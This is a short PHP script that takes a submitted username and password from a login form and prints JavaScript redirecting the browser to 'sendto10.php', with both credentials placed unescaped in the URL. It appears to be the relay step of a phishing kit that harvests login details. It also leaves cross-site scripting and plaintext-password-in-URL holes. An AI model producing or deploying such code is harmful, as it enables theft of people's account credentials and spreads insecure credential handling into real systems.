<?php

$user=$_POST['username'];
$pass=$_POST['password'];

print "<script>";
print " self.location='sendto10.php?user=$user&pass=$pass';"; 
print "</script>";

?>